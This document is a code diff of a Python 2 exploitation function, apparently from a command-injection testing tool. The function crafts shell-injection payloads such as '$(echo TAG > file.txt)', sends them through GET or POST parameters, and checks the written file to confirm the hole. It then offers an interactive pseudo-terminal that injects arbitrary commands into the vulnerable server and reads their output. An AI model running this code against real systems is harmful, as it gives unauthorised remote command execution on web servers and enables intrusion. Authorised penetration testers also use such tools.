@@ -57,373 +57,343 @@ def exploitation(url,delay,filename,http_request_method):
   output_file.write("\n(+) Technique : " + technique.title())
   output_file.close()
     
-  for whitespace in settings.WHITESPACES:
-    for prefix in settings.PREFIXES:
-      for suffix in settings.SUFFIXES:
-	for seperator in settings.SEPERATORS:
+  for prefix in settings.PREFIXES:
+    for suffix in settings.SUFFIXES:
+      for seperator in settings.SEPERATORS:
+	
+	# Check for bad combination of prefix and seperator
+	combination = prefix + seperator
+	if combination in settings.JUNK_COMBINATION:
+	  prefix = ""
+	
+	# Change TAG on every request to prevent false-positive resutls.
+	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
+	
+	# Check if defined "--base64" option.
+	if menu.options.base64_trick == True:
+	  B64_ENC_TAG = base64.b64encode(TAG)
+	  B64_DEC_TRICK = settings.B64_DEC_TRICK
+	else:
+	  B64_ENC_TAG = TAG
+	  B64_DEC_TRICK = ""
 	  
-	  # Check for bad combination of prefix and seperator
-	  combination = prefix + seperator
-	  if combination in settings.JUNK_COMBINATION:
-	    prefix = ""
-	  
-	  # Encode (urlencode) prefixes and suffixes
-	  encoded_prefix = urllib.quote_plus(prefix)
-	  encoded_suffix = urllib.quote_plus(suffix)
-
-	  # Change TAG on every request to prevent false-positive resutls.
-	  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
-	  
-	  # Check if defined "--base64" option.
-	  if menu.options.base64_trick == True:
-	    B64_ENC_TAG = base64.b64encode(TAG)
-	    B64_DEC_TRICK = settings.B64_DEC_TRICK
+	# The output file for file-based injection technique.
+	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+	
+	sys.stdout.write( "\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on "+settings.SRV_ROOT_DIR+"... ")
+	try:
+	  payload = (seperator + " " +
+		    "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " >" + OUTPUT_TEXTFILE + ")"
+		      ) 
+		  
+	  # Check if defined "--prefix" option.
+	  if menu.options.prefix:
+	    prefix = menu.options.prefix
+	    payload = prefix + payload
 	  else:
-	    B64_ENC_TAG = TAG
-	    B64_DEC_TRICK = ""
+	    payload = prefix + payload
 	    
-	  # The output file for file-based injection technique.
-	  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+	  # Check if defined "--suffix" option.
+	  if menu.options.suffix:
+	    suffix = menu.options.suffix
+	    payload = payload + suffix
+	  else:
+	    payload = payload + suffix
+
+	  #Check if defined "--verbose" option.
+	  if menu.options.verbose:
+	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
 	  
-	  sys.stdout.write( "\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on '/var/www/'... ")
-	  try:
-	    payload = (seperator + " " +
-		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
-			) 
-		    
-	    # Check if defined "--prefix" option.
-	    if menu.options.prefix:
-	      prefix = menu.options.prefix
-	      payload = prefix + payload
-	      	      
-	    else:
-	      encoded_payload = encoded_prefix + payload
-	      payload = prefix + payload
-	      
-	    # Check if defined "--suffix" option.
-	    if menu.options.suffix:
-	      suffix = menu.options.suffix
-	      payload = payload + suffix
-	      
-	    else:
-	      encoded_payload = encoded_payload + encoded_suffix
-	      payload = payload + suffix
-
-	    payload_list = []
-	    if payload != encoded_payload:
-	      print encoded_payload
-	      payload_list.append(payload)
-	      payload_list.append(encoded_payload)
-	    else:
-	      payload_list.append(payload)
+	  # Check if defined method is GET (Default).
+	  if http_request_method == "GET":
 	    
-	    for payload in payload_list :
-	      if urllib.unquote(payload) == payload:
-		is_encoded = True
-
-	      if seperator == " " :
-		payload = re.sub(" ", "%20", payload)
-	      else:
-		payload = re.sub(" ", whitespace, payload)
-
-	      #Check if defined "--verbose" option.
-	      if menu.options.verbose:
-		sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
-	      
-	      # Check if defined method is GET (Default).
-	      if http_request_method == "GET":
-		
-		# Check if its not specified the 'INJECT_HERE' tag
-		url = parameters.do_GET_check(url)
-		
-		# Encoding non-ASCII characters payload.
-		payload = urllib.quote(payload)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_GET_param(url)
-		
-		target = re.sub(settings.INJECT_TAG, payload, url)
-		request = urllib2.Request(target)
-		
-		# Check if defined extra headers.
-		headers.do_check(request)
-
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-		    
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
+	    # Check if its not specified the 'INJECT_HERE' tag
+	    url = parameters.do_GET_check(url)
 	    
-		else:
-		  response = urllib2.urlopen(request)
-		  
-	      # Check if defined method is POST.
-	      else:
-		parameter = menu.options.data
-		parameter = urllib2.unquote(parameter)
-		
-		# Check if its not specified the 'INJECT_HERE' tag
-		parameter = parameters.do_POST_check(parameter)
-		
-		# Define the POST data
-		data = re.sub(settings.INJECT_TAG, payload, parameter)
-		request = urllib2.Request(url, data)
-		
-		# Define the vulnerable parameter
-		vuln_parameter = parameters.vuln_POST_param(parameter,url)
-		
-		# Check if defined extra headers.
-		headers.do_check(request)
-
-		# Check if defined any HTTP Proxy.
-		if menu.options.proxy:
-		  try:
-		    proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		    opener = urllib2.build_opener(proxy)
-		    urllib2.install_opener(opener)
-		    response = urllib2.urlopen(request)
-				  
-		  except urllib2.HTTPError, err:
-		    print "\n(x) Error : " + str(err)
-		    sys.exit(1) 
+	    # Encoding non-ASCII characters payload.
+	    payload = urllib.quote(payload)
 	    
-		else:
-		  response = urllib2.urlopen(request)
-		  
-	      # Find the directory.
-	      path = url
-	      path_parts = path.split('/')
-	      count = 0
-	      for part in path_parts:	
-		count = count + 1
-	      count = count - 1
-	      last_param = path_parts[count]
-	      output = url.replace(last_param,OUTPUT_TEXTFILE)
-	      time.sleep(delay)
-	      
+	    # Define the vulnerable parameter
+	    vuln_parameter = parameters.vuln_GET_param(url)
+	    
+	    target = re.sub(settings.INJECT_TAG, payload, url)
+	    request = urllib2.Request(target)
+	    
+	    # Check if defined extra headers.
+	    headers.do_check(request)
+
+	    # Check if defined any HTTP Proxy.
+	    if menu.options.proxy:
 	      try:
-		output = urllib2.urlopen(output)
-		html_data = output.read()
-	      
-	      # If failed, use tmp directory
-	      except urllib2.HTTPError, e:
-		  if e.getcode() == 404:
-		    stop_injection = True
-		    if menu.options.tmp_path:
-		      tmp_path = menu.options.tmp_path
-		    else:
-		      tmp_path = settings.TMP_PATH
-		    print colors.BOLD + colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET
-		    sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on temporary directory (" + tmp_path + ")...\n")
-		    tempfile_based.exploitation(url,delay,filename,tmp_path,http_request_method)     
-		    sys.exit(0)
-		    
-	      except urllib2.URLError, e:
-		  print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
-		  sys.exit(0)
-		  
-	    shell = re.findall(r""+TAG+"", html_data)
-	  except:
-	    print 
-	    if stop_injection:
-	      raise
+		proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		opener = urllib2.build_opener(proxy)
+		urllib2.install_opener(opener)
+		response = urllib2.urlopen(request)
+		
+	      except urllib2.HTTPError, err:
+		print "\n(x) Error : " + str(err)
+		sys.exit(1) 
+	
 	    else:
-	      continue
+	      response = urllib2.urlopen(request)
+	      
+	  # Check if defined method is POST.
+	  else:
+	    parameter = menu.options.data
+	    parameter = urllib2.unquote(parameter)
+	    
+	    # Check if its not specified the 'INJECT_HERE' tag
+	    parameter = parameters.do_POST_check(parameter)
+	    
+	    # Define the POST data
+	    data = re.sub(settings.INJECT_TAG, payload, parameter)
+	    request = urllib2.Request(url, data)
+	    
+	    # Define the vulnerable parameter
+	    vuln_parameter = parameters.vuln_POST_param(parameter,url)
+	    
+	    # Check if defined extra headers.
+	    headers.do_check(request)
+
+	    # Check if defined any HTTP Proxy.
+	    if menu.options.proxy:
+	      try:
+		proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+		opener = urllib2.build_opener(proxy)
+		urllib2.install_opener(opener)
+		response = urllib2.urlopen(request)
+			      
+	      except urllib2.HTTPError, err:
+		print "\n(x) Error : " + str(err)
+		sys.exit(1) 
+	
+	    else:
+	      response = urllib2.urlopen(request)
+	      
+	  # Find the directory.
+	  path = url
+	  path_parts = path.split('/')
+	  count = 0
+	  for part in path_parts:	
+	    count = count + 1
+	  count = count - 1
+	  last_param = path_parts[count]
+	  output = url.replace(last_param,OUTPUT_TEXTFILE)
+	  time.sleep(delay)
 	  
-	  if shell:
-	    	    
-	    found = True
-	    no_result = False
-	    if http_request_method == "GET":
-	      	      
-	      # Print the findings to log file
-	      if vp_flag == True:
-		output_file = open(filename + ".txt", "a")
-		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-		output_file.write("\n---\n")
-		vp_flag = False
-		output_file.close()
+	  try:
+	    output = urllib2.urlopen(output)
+	    html_data = output.read()
+	  
+	  # If temp-based attack failed, 
+	  # use /tmp/ directory for temp-based.
+	  except urllib2.HTTPError, e:
+	      if e.getcode() == 404:
 		
-	      counter = counter + 1
+		stop_injection = False
+		if menu.options.tmp_path:
+		  tmp_path = menu.options.tmp_path
+		else:
+		  tmp_path = settings.TMP_PATH
+		print colors.BOLD + colors.RED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET
+		sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on temporary directory (" + tmp_path + ")...\n")
+		tempfile_based.exploitation(url,delay,filename,tmp_path,http_request_method)     
+		sys.exit(0)
+		
+	  except urllib2.URLError, e:
+	      print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
+	      sys.exit(0)
+		
+	  shell = re.findall(r""+TAG+"", html_data)
+	except:
+	  print 
+	  if stop_injection:
+	    raise
+	  else:
+	    continue
+	
+	if shell:
+		  
+	  found = True
+	  no_result = False
+	  if http_request_method == "GET":
+		    
+	    # Print the findings to log file
+	    if vp_flag == True:
 	      output_file = open(filename + ".txt", "a")
-	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
+	      output_file.write("\n---\n")
+	      vp_flag = False
 	      output_file.close()
 	      
-	      # Print the findings to terminal.
-	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
-	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
-	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
-	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
-	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
+	    counter = counter + 1
+	    output_file = open(filename + ".txt", "a")
+	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	    output_file.close()
+	    
+	    # Print the findings to terminal.
+	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
+	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
+	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
+	    print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
+	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
 
-	    else :
-	      
-	      # Print the findings to log file
-	      if vp_flag == True:
-		output_file = open(filename + ".txt", "a")
-		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-		output_file.write("\n---\n")
-		vp_flag = False
-		output_file.close()
-		
-	      counter = counter + 1
+	  else :
+	    
+	    # Print the findings to log file
+	    if vp_flag == True:
 	      output_file = open(filename + ".txt", "a")
-	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
+	      output_file.write("\n---\n")
+	      vp_flag = False
 	      output_file.close()
 	      
-	      # Print the findings to terminal.
-	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
-	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
-	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
-	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
-	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
-	      	      
-	    gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
-	    if gotshell == "Y" or gotshell == "y":
-	      print ""
-	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
-	      
-	      while True:
-		try:
-		  cmd = raw_input("Shell > ")
-		  
-		  if cmd == "q":
-		    sys.exit(0)
+	    counter = counter + 1
+	    output_file = open(filename + ".txt", "a")
+	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	    output_file.close()
+	    
+	    # Print the findings to terminal.
+	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
+	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
+	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
+	    print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
+	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
 		    
-		  else:
-		    payload = (seperator +
-			      "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
-			      )
-		    
-		    if seperator == " " :
-		      payload = re.sub(" ", "%20", payload)
-		    else:
-		      payload = re.sub(" ", whitespace, payload)
-
-		    # Check if defined "--prefix" option.
-		    if menu.options.prefix:
-		      prefix = menu.options.prefix
-		      payload = prefix + payload
-		    else:
-		      if is_encoded == True:
-			payload = encoded_prefix + payload
-		      else:
-			payload = prefix + payload
-		      
-		    # Check if defined "--suffix" option.
-		    if menu.options.suffix:
-		      suffix = menu.options.suffix
-		      payload = payload + suffix
-		    else:
-		      if is_encoded == True:
-			payload = payload + encoded_suffix
-		      else:
-			payload = payload + suffix
-			
-		    # Check if defined "--verbose" option.
-		    if menu.options.verbose:
-		      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
-		      
-		    # Check if defined method is GET (Default).
-		    if http_request_method == "GET":
-		      
-		      # Check if its not specified the 'INJECT_HERE' tag
-		      url = parameters.do_GET_check(url)
-		      
-		      target = re.sub(settings.INJECT_TAG, payload, url)
-		      vuln_parameter = ''.join(vuln_parameter)
-		      request = urllib2.Request(target)
-		      
-		      # Check if defined extra headers.
-		      headers.do_check(request)	
-			
-		      # Check if defined any HTTP Proxy.
-		      if menu.options.proxy:
-			try:
-			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-			  opener = urllib2.build_opener(proxy)
-			  urllib2.install_opener(opener)
-			  response = urllib2.urlopen(request)
-					  
-			except urllib2.HTTPError, err:
-			  print "\n(x) Error : " + str(err)
-			  sys.exit(1) 
-		  
-		      else:
-			response = urllib2.urlopen(request)
-			
-		    else :
-		      
-		      # Check if defined method is POST.
-		      parameter = menu.options.data
-		      parameter = urllib2.unquote(parameter)
-		      
-		      # Check if its not specified the 'INJECT_HERE' tag
-		      parameter = parameters.do_POST_check(parameter)
-		      
-		      data = re.sub(settings.INJECT_TAG, payload, parameter)
-		      request = urllib2.Request(url, data)
-		      
-		      # Check if defined extra headers.
-		      headers.do_check(request)	
-			
-		      # Check if defined any HTTP Proxy.
-		      if menu.options.proxy:
-			try:
-			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-			  opener = urllib2.build_opener(proxy)
-			  urllib2.install_opener(opener)
-			  response = urllib2.urlopen(request)
-					  
-			except urllib2.HTTPError, err:
-			  print "\n(x) Error : " + str(err)
-			  sys.exit(1) 
-		  
-		      else:
-			response = urllib2.urlopen(request)
-			
-		    path = url
-		    path_parts = path.split('/')
-		    count = 0
-		    
-		    for part in path_parts:	
-		      count = count + 1
-
-		    count = count - 1
-		    last_param = path_parts[count]
-		    output = url.replace(last_param, OUTPUT_TEXTFILE)
-		    time.sleep(delay)
-				    
-		    try:
-		      output = urllib2.urlopen(output)
-		      html_data = output.read()
-		      
-		    except urllib2.HTTPError, e:
-			if e.getcode() == 404:
-			  continue
-		      
-		    except urllib2.URLError, e:
-			pass
-		      
-		    shell = re.findall(r"(.*)", html_data)
-		    
-		    if shell:
-		      shell = "".join(str(p) for p in shell)
-		      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
-
-		except KeyboardInterrupt: 
-		  print ""
+	  gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
+	  if gotshell == "Y" or gotshell == "y":
+	    print ""
+	    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+	    
+	    while True:
+	      try:
+		cmd = raw_input("Shell > ")
+		
+		if cmd == "q":
 		  sys.exit(0)
-	      
-	    else:
-	      print "(*) Continue testing the "+ technique +"... "
-	      pass
+		  
+		else:
+		  payload = (seperator +
+			    "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
+			    )
+		  
+		  if seperator == " " :
+		    payload = re.sub(" ", "%20", payload)
+		  else:
+		    payload = re.sub(" ", whitespace, payload)
+
+		  # Check if defined "--prefix" option.
+		  if menu.options.prefix:
+		    prefix = menu.options.prefix
+		    payload = prefix + payload
+		  else:
+		    payload = prefix + payload
+		    
+		  # Check if defined "--suffix" option.
+		  if menu.options.suffix:
+		    suffix = menu.options.suffix
+		    payload = payload + suffix
+		  else:
+		    payload = payload + suffix
+		      
+		  # Check if defined "--verbose" option.
+		  if menu.options.verbose:
+		    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+		    
+		  # Check if defined method is GET (Default).
+		  if http_request_method == "GET":
+		    
+		    # Check if its not specified the 'INJECT_HERE' tag
+		    url = parameters.do_GET_check(url)
+		    
+		    target = re.sub(settings.INJECT_TAG, payload, url)
+		    vuln_parameter = ''.join(vuln_parameter)
+		    request = urllib2.Request(target)
+		    
+		    # Check if defined extra headers.
+		    headers.do_check(request)	
+		      
+		    # Check if defined any HTTP Proxy.
+		    if menu.options.proxy:
+		      try:
+			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+			opener = urllib2.build_opener(proxy)
+			urllib2.install_opener(opener)
+			response = urllib2.urlopen(request)
+					
+		      except urllib2.HTTPError, err:
+			print "\n(x) Error : " + str(err)
+			sys.exit(1) 
+		
+		    else:
+		      response = urllib2.urlopen(request)
+		      
+		  else :
+		    
+		    # Check if defined method is POST.
+		    parameter = menu.options.data
+		    parameter = urllib2.unquote(parameter)
+		    
+		    # Check if its not specified the 'INJECT_HERE' tag
+		    parameter = parameters.do_POST_check(parameter)
+		    
+		    data = re.sub(settings.INJECT_TAG, payload, parameter)
+		    request = urllib2.Request(url, data)
+		    
+		    # Check if defined extra headers.
+		    headers.do_check(request)	
+		      
+		    # Check if defined any HTTP Proxy.
+		    if menu.options.proxy:
+		      try:
+			proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
+			opener = urllib2.build_opener(proxy)
+			urllib2.install_opener(opener)
+			response = urllib2.urlopen(request)
+					
+		      except urllib2.HTTPError, err:
+			print "\n(x) Error : " + str(err)
+			sys.exit(1) 
+		
+		    else:
+		      response = urllib2.urlopen(request)
+		      
+		  path = url
+		  path_parts = path.split('/')
+		  count = 0
+		  
+		  for part in path_parts:	
+		    count = count + 1
+
+		  count = count - 1
+		  last_param = path_parts[count]
+		  output = url.replace(last_param, OUTPUT_TEXTFILE)
+		  time.sleep(delay)
+				  
+		  try:
+		    output = urllib2.urlopen(output)
+		    html_data = output.read()
+		    
+		  except urllib2.HTTPError, e:
+		      if e.getcode() == 404:
+			continue
+		    
+		  except urllib2.URLError, e:
+		      pass
+		    
+		  shell = re.findall(r"(.*)", html_data)
+		  
+		  if shell:
+		    shell = "".join(str(p) for p in shell)
+		    print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
+
+	      except KeyboardInterrupt: 
+		print ""
+		sys.exit(0)
+	    
+	  else:
+	    print "(*) Continue testing the "+ technique +"... "
+	    pass
 
   if no_result == True:
     if menu.options.verbose == False:
@@ -437,3 +407,4 @@ def exploitation(url,delay,filename,http_request_method):
   else :
     print ""
     
+
